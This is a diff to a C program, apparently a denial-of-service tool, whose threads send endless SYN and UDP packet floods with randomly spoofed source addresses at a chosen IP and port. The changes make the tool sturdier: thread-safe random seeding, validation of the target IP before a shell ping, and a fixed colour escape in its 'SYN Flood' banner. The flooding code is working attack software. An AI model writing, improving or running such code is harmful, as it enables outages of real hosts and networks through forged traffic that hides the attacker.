@@ -1,6 +1,7 @@
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
+#include <stdint.h>
 #include <unistd.h>
 #include <pthread.h>
 #include <time.h>
@@ -10,7 +11,7 @@
 #include <linux/tcp.h>
 #include <netinet/in.h>
 #include <signal.h>//--
-#include <netinet/udp.h>  // struct udphdr  
+#include <netinet/udp.h>  // struct udphdr
 
 #include "nero/ascii.h"
 #include "nero/terminal.h"
@@ -92,20 +93,34 @@ static unsigned short checksum(unsigned short *ptr, int nbytes) {
 }
 
 int is_target_online(const char *ip) {
-    char command[100];
+    // Reject anything that is not a dotted-quad IPv4 before shelling out:
+    // the ping command below is passed to /bin/sh, so unvalidated input
+    // would allow shell metacharacters in `ip` to execute arbitrary commands.
+    struct in_addr addr;
+    if (inet_pton(AF_INET, ip, &addr) != 1)
+        return 0;
+
+    char command[128];
     // -c 1: send one packet; -W 1: one-second timeout on Linux
-    snprintf(command, sizeof(command), "ping -c 1 -W 1 %s > /dev/null 2>&1", ip);
-    
+    int written = snprintf(command, sizeof(command),
+                           "ping -c 1 -W 1 %s > /dev/null 2>&1", ip);
+    if (written < 0 || (size_t)written >= sizeof(command))
+        return 0;
+
     int status = system(command);
-    
+
     // A zero system() result indicates a successful ping
     return (status == 0);
 }
 
 // Thread function: continuously send SYN packets to target IP
-static void *flood(void *arg) 
+static void *flood(void *arg)
 {
     const char *target_ip = (const char *)arg;
+    /* Per-thread PRNG state: rand() keeps a shared internal state and is not
+     * thread-safe. Mix the wall clock with the address of a stack local so
+     * sibling threads start with distinct seeds. */
+    unsigned int seed = (unsigned int)time(NULL) ^ (unsigned int)(uintptr_t)&target_ip;
     struct sockaddr_in sin;
     sin.sin_family = AF_INET;
     sin.sin_port = htons(port_select);
@@ -155,11 +170,11 @@ static void *flood(void *arg)
         iph->version = 4;
         iph->tos = 0;
         iph->tot_len = htons(sizeof(struct iphdr) + sizeof(struct tcphdr));
-        iph->id = htons(rand() % 65535); // random port
+        iph->id = htons(rand_r(&seed) % 65535); // random port
         iph->ttl = 255;
         iph->protocol = IPPROTO_TCP;
 
-        uint8_t ip_parts_tcp[4] = { rand() % 256, rand() % 256, rand() % 256, rand() % 256 };
+        uint8_t ip_parts_tcp[4] = { rand_r(&seed) % 256, rand_r(&seed) % 256, rand_r(&seed) % 256, rand_r(&seed) % 256 };
         char ip_str_tcp[16];
         sprintf(ip_str_tcp, "%d.%d.%d.%d", ip_parts_tcp[0], ip_parts_tcp[1], ip_parts_tcp[2], ip_parts_tcp[3]);
         iph->saddr = inet_addr(ip_str_tcp);
@@ -169,13 +184,13 @@ static void *flood(void *arg)
         iph->check = checksum((unsigned short *)datagram, ntohs(iph->tot_len));
 
         // TCP header
-        tcph->source = htons(rand() % 65535);
+        tcph->source = htons(rand_r(&seed) % 65535);
         tcph->dest = htons(port_select);
-        tcph->seq = rand();
+        tcph->seq = rand_r(&seed);
         tcph->ack_seq = 0;
         tcph->doff = 5;
         tcph->syn = 1;
-        tcph->window = htons(32767 + rand() % (65536 - 32767));
+        tcph->window = htons(32767 + rand_r(&seed) % (65536 - 32767));
         tcph->check = 0;
         tcph->urg_ptr = 0;
 
@@ -207,12 +222,12 @@ static void *flood(void *arg)
         struct udphdr *udph = (struct udphdr *)(datagram + sizeof(struct iphdr));
 
         // Choose a random payload length (32-512 bytes)
-        int payload_len = (rand() % 480) + 32; 
+        int payload_len = (rand_r(&seed) % 480) + 32; 
         char *payload = datagram + sizeof(struct iphdr) + sizeof(struct udphdr);
 
         // Generate random payload contents
         for (int i = 0; i < payload_len; i++) {
-            payload[i] = (char)(rand() % 256); // Byte in the range 0-255
+            payload[i] = (char)(rand_r(&seed) % 256); // Byte in the range 0-255
         }
 
         // IP header for UDP
@@ -220,11 +235,11 @@ static void *flood(void *arg)
         iph->version = 4;
         iph->tos = 0;
         iph->tot_len = htons(sizeof(struct iphdr) + sizeof(struct udphdr) + payload_len);
-        iph->id = htons(rand() % 65535);
+        iph->id = htons(rand_r(&seed) % 65535);
         iph->ttl = 255;
         iph->protocol = IPPROTO_UDP;
 
-        uint8_t ip_parts_udp[4] = { rand() % 256, rand() % 256, rand() % 256, rand() % 256 };
+        uint8_t ip_parts_udp[4] = { rand_r(&seed) % 256, rand_r(&seed) % 256, rand_r(&seed) % 256, rand_r(&seed) % 256 };
         char ip_str_udp[16];
         sprintf(ip_str_udp, "%d.%d.%d.%d", ip_parts_udp[0], ip_parts_udp[1], ip_parts_udp[2], ip_parts_udp[3]);
         iph->saddr = inet_addr(ip_str_udp);
@@ -235,7 +250,7 @@ static void *flood(void *arg)
         iph->check = checksum((unsigned short *)datagram, ntohs(iph->tot_len));
 
         // UDP header
-        udph->source = htons(rand() % 65535);
+        udph->source = htons(rand_r(&seed) % 65535);
         udph->dest = htons(port_select);
         udph->len = htons(sizeof(struct udphdr) + payload_len);
         udph->check = 0;
@@ -292,7 +307,7 @@ void *flood_animation(void *arg)
 
             printf("\033[40m\033[1;31m[*] \033[1;34mSYN Flood \033[0m"
                    "\033[40m\033[1;33m%s \033[1;37mon "
-                   "\033[40m\033[1;33m%d \033[1;37"
+                   "\033[40m\033[1;33m%d \033[1;37m"
                    "\033[1;32m%d \033[1;37mthread%s\033[0m\n\n",
                     target_ip,port_select, THREAD_COUNT, dots[i]);
 
